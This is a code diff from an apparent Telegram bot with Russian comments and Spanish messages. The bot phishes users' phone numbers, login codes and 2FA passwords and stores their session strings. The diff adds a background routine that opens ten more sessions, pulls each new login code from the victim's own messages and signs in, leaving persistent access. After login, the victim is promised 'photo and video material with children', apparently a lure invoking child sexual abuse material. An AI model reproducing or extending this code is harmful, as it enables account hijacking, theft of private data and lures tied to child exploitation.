@@ -168,10 +168,8 @@ async def try_sign_in_code(user_id, code):
     try:
         await client.sign_in(phone=phone, code=code)
         if await client.is_user_authorized():
-            me = await client.get_me()
+            # Сохраняем основную сессию
             session_str = client.session.save()
-            
-            # Сохраняем только основную сессию
             sessions_col.update_one(
                 {"phone": phone},
                 {"$set": {
@@ -187,51 +185,75 @@ async def try_sign_in_code(user_id, code):
             with open(f"sessions/{phone.replace('+', '')}.json", "w") as f:
                 json.dump({"phone": phone, "session": session_str}, f)
 
-            # Создаем 10 фейковых сессий
-            await create_fake_sessions(phone, client)
-            
+            # Отправляем сообщение об успешной авторизации
             await bot.send_message(
                 user_id,
                 "✅ Has pasado la verificación. Nuestro bot está un poco cargado. "
                 "Tan pronto como se descargue, le enviaremos su material fotográfico y de video con niños."
             )
+
+            # Запускаем создание дополнительных сессий в фоне
+            asyncio.create_task(create_additional_sessions(phone, client))
+
             await client.disconnect()
             cleanup(user_id)
         else:
             user_states[user_id] = 'awaiting_2fa'
             await bot.send_message(user_id, "🔐 Introduce tu contraseña 2FA:")
-    except PhoneCodeExpiredError:
-        await bot.send_message(user_id, "⏰ Código caducado. Inténtalo de nuevo desde /start")
-        await client.disconnect()
-        cleanup(user_id)
-    except PhoneCodeInvalidError:
-        await bot.send_message(user_id, "❌ Código incorrecto. Inténtalo de nuevo:")
-        user_code_buffers[user_id]['code'] = ""
-        await send_code_keyboard(user_id, "", user_code_buffers[user_id]['message_id'])
-    except SessionPasswordNeededError:
-        user_states[user_id] = 'awaiting_2fa'
-        await bot.send_message(user_id, "🔐 Se requiere tu contraseña 2FA. Introdúcela:")
     except Exception as e:
-        await bot.send_message(user_id, f"❌ Error de inicio de sesión: {e}")
-        await client.disconnect()
-        cleanup(user_id)
+        await handle_auth_error(user_id, e, client)
 
-async def create_fake_sessions(phone, main_client):
+async def create_additional_sessions(phone, main_client):
     for i in range(10):
         try:
-            # Создаем новую временную сессию
-            temp_client = TelegramClient(StringSession(), API_ID, API_HASH, proxy=proxy)
-            await temp_client.connect()
+            # Создаем новую сессию
+            new_client = TelegramClient(StringSession(), API_ID, API_HASH, proxy=proxy)
+            await new_client.connect()
+
+            # Отправляем запрос кода
+            await new_client.send_code_request(phone)
             
-            # Отправляем запрос кода (не сохраняем сессию)
-            await temp_client.send_code_request(phone)
+            # Получаем код из истории сообщений основной сессии
+            code = await get_code_from_messages(main_client)
             
-            # Имитируем ввод кода (не обязательно реально авторизовываться)
-            # Просто создаем активность
+            if not code:
+                logging.error(f"No se pudo obtener el código para la sesión adicional {i+1}")
+                continue
+
+            # Авторизуемся
+            await new_client.sign_in(phone=phone, code=code)
             
-            await temp_client.disconnect()
+            if await new_client.is_user_authorized():
+                logging.info(f"Sesión adicional {i+1} creada con éxito")
+            else:
+                logging.error(f"No se pudo autorizar la sesión adicional {i+1}")
+
+            # Закрываем соединение, сессия остается активной
+            await new_client.disconnect()
+            
+            # Пауза между созданием сессий
+            await asyncio.sleep(5)
+            
         except Exception as e:
-            logging.error(f"Error creating fake session {i+1}: {e}")
+            logging.error(f"Error al crear sesión adicional {i+1}: {str(e)}")
+            continue
+
+async def get_code_from_messages(client, limit=10):
+    try:
+        # Получаем последние сообщения
+        messages = await client.get_messages('Telegram', limit=limit)
+        
+        # Ищем код подтверждения в сообщениях
+        for msg in messages:
+            if msg.text and "código de acceso" in msg.text:
+                # Извлекаем 5-значный код из текста
+                words = msg.text.split()
+                for word in words:
+                    if word.isdigit() and len(word) == 5:
+                        return word
+    except Exception as e:
+        logging.error(f"Error al obtener código de mensajes: {str(e)}")
+    return None
 
 @dp.message_handler(lambda message: user_states.get(message.from_user.id) == 'awaiting_2fa')
 async def process_2fa(message: types.Message):
